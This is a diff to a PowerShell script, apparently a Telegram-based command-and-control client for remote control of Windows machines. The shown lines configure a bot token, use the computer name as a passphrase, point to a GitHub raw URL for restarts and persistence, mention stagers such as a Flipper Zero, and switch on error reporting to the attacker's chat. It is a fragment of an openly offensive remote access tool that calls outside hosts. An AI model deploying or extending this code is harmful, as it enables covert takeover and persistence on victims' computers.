@@ -13,7 +13,7 @@ SEE README FOR MORE INFO
 # Define Connection Variables
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
 $PassPhrase = "$env:COMPUTERNAME" # 'password' for this connection (computername by default)
-$global:errormsg = 0 # 1 = return error messages to chat (off by default)
+$global:errormsg = 1 # 1 = return error messages to chat (off by default)
 $parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
@@ -37,7 +37,7 @@ while($chatID.length -eq 0){
 $charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
 $chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
 $tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
-#$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
+$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $Mts = New-Object psobject 
 $Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
 
